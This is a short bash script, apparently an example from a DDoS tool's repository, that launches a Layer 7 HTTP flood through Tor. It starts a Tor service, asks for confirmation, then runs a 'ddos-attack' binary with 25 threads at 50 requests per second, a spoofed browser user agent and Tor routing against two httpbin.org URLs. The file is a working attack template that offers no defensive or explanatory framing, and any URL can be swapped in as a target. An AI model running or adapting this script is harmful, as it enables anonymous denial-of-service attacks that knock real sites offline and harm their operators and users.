#!/bin/bash

# HTTP flood attack with Tor anonymization
# This script demonstrates Layer 7 HTTP flooding via Tor

echo "HTTP Flood Attack via Tor Example"
echo "================================="

# Target configuration
TARGET_URLS="https://httpbin.org/delay/1,https://httpbin.org/anything"
THREADS=25
RATE=50
METHOD="GET"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

echo "Targets: $TARGET_URLS"
echo "Threads: $THREADS"
echo "Rate: $RATE requests/sec"
echo "Method: $METHOD"
echo "Using Tor: Yes"
echo ""

echo "Starting Tor service..."
./target/release/ddos-attack tor --start

sleep 5

read -p "Continue with HTTP flood? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "Starting HTTP flood attack via Tor..."
    
    ./target/release/ddos-attack layer7 \
        --targets "$TARGET_URLS" \
        --threads $THREADS \
        --rate $RATE \
        --method "$METHOD" \
        --user-agent "$USER_AGENT" \
        --tor
else
    echo "Attack cancelled."
    echo "Stopping Tor service..."
    ./target/release/ddos-attack tor --stop
fi
